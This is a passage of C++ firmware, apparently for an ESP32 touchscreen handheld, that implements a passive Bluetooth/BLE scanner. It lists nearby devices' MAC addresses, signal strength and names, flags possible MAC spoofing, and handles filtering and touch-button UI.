    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].mac == device.mac && i != deviceCount) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Possible Spoofing (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void cleanupDevices(unsigned long timestamp) {
    for (int i = 0; i < deviceCount; ) {
      if (timestamp - devices[i].lastSeen > Config::deviceTimeout) {
        if (devices[i].isSuspicious) suspiciousCount--;
        for (int j = i; j < deviceCount - 1; j++) {
          devices[j] = devices[j + 1];
        }
        deviceCount--;
      } else {
        i++;
      }
    }
  }

  void filterByMac(const String& filterMac) {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = (devices[i].mac == filterMac);
    }
    refreshDisplay();
  }

  void filterSuspicious() {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = devices[i].isSuspicious;
    }
    refreshDisplay();
  }

  void refreshDisplay() {
    for (int i = 0; i < MAX_LINES; i++) {
      displayLines[i].text = "";
      displayLines[i].color = GREEN;
      displayLines[i].originalColor = GREEN;
      displayLines[i].isAlert = false;
      displayLines[i].flashUntil = 0;
      displayLines[i].type = MessageType::DEVICE;
    }
    lineNumber = 1;
    {
      const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
      const int bodyH = bleContentBottom() - bodyTop;
      if (bodyH > 0) {
        tft.fillRect(0, bodyTop, tft.width(), bodyH, TFT_BLACK);
      }
    }
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].display) {
        String protocol = devices[i].isBLE ? "BLE" : "BT";
        String line = String(lineNumber++) + " -> " + devices[i].mac + " (" + String(devices[i].rssi) + " dBm, " + protocol + ")";
        if (devices[i].isBLE && !devices[i].deviceName.isEmpty()) line += " N:" + devices[i].deviceName.substring(0, 6);
        if (devices[i].isBLE && !devices[i].serviceUUID.isEmpty()) line += " U:" + devices[i].serviceUUID.substring(0, 8);
        line += " T:" + String(devices[i].lastSeen).substring(0, 6);
        addLine(line, devices[i].isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
      }
    }
  }

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, 36, 240, UI_LINE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
            deviceCount = 0;
            suspiciousCount = 0;
            lastDeviceCount = -1;
            lastSuspiciousCount = -1;
            lineNumber = 1;
            for (int i = 0; i < MAX_LINES; i++) {
              displayLines[i].text = "";
              displayLines[i].color = GREEN;
              displayLines[i].originalColor = GREEN;
              displayLines[i].isAlert = false;
              displayLines[i].flashUntil = 0;
              displayLines[i].type = MessageType::DEVICE;
            }
            refreshDisplay();
            addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
          break;
        case 1:
           filterSuspicious();
          break;
        case 2:
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  static bool s_headerTouchHeld = false;
  const unsigned long touchCheckInterval = 25;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x = 0;
    int y = 0;
    int hitIcon = -1;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              hitIcon = i;
            }
            break;
          }
        }
      }
    }
    if (hitIcon >= 0) {
      if (!s_headerTouchHeld) {
        if (hitIcon == 2) {
          feature_exit_requested = true;
        } else {
          tft.drawBitmap(iconX[hitIcon], iconY, icons[hitIcon], ICON_SIZE, ICON_SIZE, TFT_BLACK);
          animationState = 1;
          activeIcon = hitIcon;
          lastAnimationTime = millis();
        }
      }
      s_headerTouchHeld = true;
    } else {
      s_headerTouchHeld = false;
    }
    lastTouchCheck = millis();
  }
}

public:
  void setup() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();

    setupTouchscreen();

    initDisplay();

    releaseBleCallbacks();
    ensureBleStackReady();
    pBLEScan = BLEDevice::getScan();
    bleDeviceCallbacks = new AdvertisedDeviceCallbacks(*this);
    pBLEScan->setAdvertisedDeviceCallbacks(bleDeviceCallbacks);
    pBLEScan->setActiveScan(true);
    scanning = true;

    addLine("Bluetooth Sniffer Ready", DARK_GRAY, true, MessageType::STATUS);
    startBLEScan();
  }

  void loop() {
    // Remapped layout: LEFT exits now (was SELECT via featureExitButtonPressed()).
    if (feature_exit_requested || isButtonPressed(BTN_LEFT)) {
      feature_exit_requested = true;
      return;
    }

    unsigned long now = millis();
    tft.drawFastHLine(0, 19, 240, UI_LINE);

    runUI();
    if (feature_exit_requested || isButtonPressed(BTN_LEFT)) {
      feature_exit_requested = true;
      return;
    }
    updateStatusBar();
    cleanupDevices(now);
    if (scanning && now - lastScanTime >= SCAN_INTERVAL) {
      if (isBLEScanActive) {
        pBLEScan->stop();
        startBTScan();
        isBLEScanActive = false;
      } else {

        startBLEScan();
        isBLEScanActive = true;
      }
      lastScanTime = now;
    }
    if (Serial.available()) {
      String input = Serial.readStringUntil('\n');
      input.trim();
      if (input.startsWith("FILTER MAC ")) {
        filterByMac(input.substring(11));
      } else if (input == "FILTER SUSPICIOUS") {
        filterSuspicious();
      } else if (input == "RESET") {
        deviceCount = 0;
        suspiciousCount = 0;
        lastDeviceCount = -1;
        lastSuspiciousCount = -1;
        lineNumber = 1;
        for (int i = 0; i < MAX_LINES; i++) {
          displayLines[i].text = "";
          displayLines[i].color = GREEN;
          displayLines[i].originalColor = GREEN;
          displayLines[i].isAlert = false;
          displayLines[i].flashUntil = 0;
          displayLines[i].type = MessageType::DEVICE;
        }
        refreshDisplay();
        addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
      }
    }
  }

  class AdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    BluetoothSniffer& sniffer;
  public:
    AdvertisedDeviceCallbacks(BluetoothSniffer& s) : sniffer(s) {}
    void onResult(BLEAdvertisedDevice* advertisedDevice) override {
      if (!sniffer.scanning) return;
      String mac = advertisedDevice->getAddress().toString().c_str();
      int rssi = advertisedDevice->getRSSI();
      unsigned long timestamp = millis();
      int idx = -1;
      for (int i = 0; i < sniffer.deviceCount; i++) {
        if (sniffer.devices[i].mac == mac && sniffer.devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        sniffer.devices[idx].rssi = rssi;
        sniffer.devices[idx].packetCount++;
        sniffer.devices[idx].lastSeen = timestamp;
        if (sniffer.isRandomizedMac(mac)) {
          sniffer.devices[idx].macChangeCount++;
        }
        sniffer.checkSuspiciousActivity(idx, timestamp);
      } else {
        sniffer.processNewDevice(advertisedDevice, nullptr, timestamp, true);
      }
    }
  };

  static void btCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (!snifferInstance) return;
    if (event == ESP_BT_GAP_DISC_RES_EVT) {
      unsigned long timestamp = millis();
      int idx = -1;
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
               param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
      String mac = macStr;
      for (int i = 0; i < snifferInstance->deviceCount; i++) {
        if (snifferInstance->devices[i].mac == mac && !snifferInstance->devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        snifferInstance->devices[idx].packetCount++;
        snifferInstance->devices[idx].lastSeen = timestamp;
        snifferInstance->checkSuspiciousActivity(idx, timestamp);
      } else {
        snifferInstance->processNewDevice(nullptr, param, timestamp, false);
      }
    }
  }

  void startBLEScan() {
    newDevicesThisScan = 0;
    constexpr int kScanChunkSec = 1;
    for (int elapsed = 0; elapsed < Config::bleScanDuration; elapsed += kScanChunkSec) {
      // Remapped layout: LEFT exits now (was SELECT via featureExitButtonPressed()).
      if (feature_exit_requested || isButtonPressed(BTN_LEFT)) {
        feature_exit_requested = true;
        if (pBLEScan) {
          pBLEScan->stop();
        }
        return;
      }
      pBLEScan->start(kScanChunkSec, false);
    }
    addLine("BLE Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void startBTScan() {
    newDevicesThisScan = 0;

    addLine("Classic BT Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void setSnifferInstance() {
    snifferInstance = this;
  }

  void stop() {
    scanning = false;
    snifferInstance = nullptr;
    releaseBleCallbacks();
  }
};

BluetoothSniffer* BluetoothSniffer::snifferInstance = nullptr;
BluetoothSniffer sniffer;

void blesnifferSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleSetExitOnlyNavLabels();
  bleClearBody(TFT_BLACK);
  {
    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
  }
  redrawTouchButtonBar();
  {
    const int bodyH = bleContentBottom() - 37;
    if (bodyH > 0) {
      tft.fillRect(0, 37, 240, bodyH, TFT_BLACK);
    }
  }
  sniffer.setup();
  sniffer.setSnifferInstance();
  redrawTouchButtonBar();
}

void blesnifferLoop() {

  // Remapped layout: LEFT exits now (was SELECT via featureExitButtonPressed()).
  // This feature has no other physical action -- Clear/Filter stay touch-icon-only.
  if (feature_active && isButtonPressed(BTN_LEFT)) {
    feature_exit_requested = true;
    return;
  }

  sniffer.loop();
}

void exit() {

  sniffer.stop();
}
}
